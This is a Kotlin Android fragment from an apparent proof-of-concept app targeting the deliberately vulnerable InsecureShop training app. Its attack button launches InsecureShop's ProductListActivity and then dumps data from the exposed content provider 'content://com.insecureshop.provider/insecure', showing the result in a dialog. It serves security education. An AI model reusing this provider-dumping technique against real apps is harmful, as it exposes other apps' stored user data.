package com.websarva.wings.android.insecureshoppoc.ui.fragment.storage

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import androidx.fragment.app.Fragment
import androidx.fragment.app.viewModels
import com.websarva.wings.android.insecureshoppoc.R
import com.websarva.wings.android.insecureshoppoc.databinding.FragmentStorage6Binding
import com.websarva.wings.android.insecureshoppoc.ui.fragment.InfoDialogFragment
import com.websarva.wings.android.insecureshoppoc.viewmodel.fragment.storage.StorageViewModel
import dagger.hilt.android.AndroidEntryPoint

@AndroidEntryPoint
class Storage6Fragment: Fragment() {
    private var _binding: FragmentStorage6Binding? = null
    private val binding
    get() = _binding!!

    private val viewModel: StorageViewModel by viewModels()

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentStorage6Binding.inflate(inflater, container, false)

        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        binding.btAttack.setOnClickListener {
            try {
                // Mainアクティビティの起動準備
                val intent = Intent(Intent.ACTION_MAIN).apply {
                    setClassName("com.insecureshop", "com.insecureshop.ProductListActivity")
                }
                // 対象activityの起動
                startActivity(intent)

                // 1秒後に攻撃を開始
                Handler(Looper.myLooper()!!).postDelayed({
                    viewModel.dump(Uri.parse("content://com.insecureshop.provider/insecure"))
                }, 1000)
            }catch (e: Exception){
                Log.d("test", e.printStackTrace().toString())
                Toast.makeText(activity, getString(R.string.storage_6_toast_error), Toast.LENGTH_SHORT).show()
            }
        }

        viewModel.resultDump.observe(this.viewLifecycleOwner){
            if (!it.isNullOrBlank()){
                activity?.let { activity ->
                    InfoDialogFragment(getString(R.string.storage_6_title), it).show(activity.supportFragmentManager, "InfoDialog")
                }
            }
        }
    }

    override fun onDestroyView() {
        _binding = null

        super.onDestroyView()
    }
}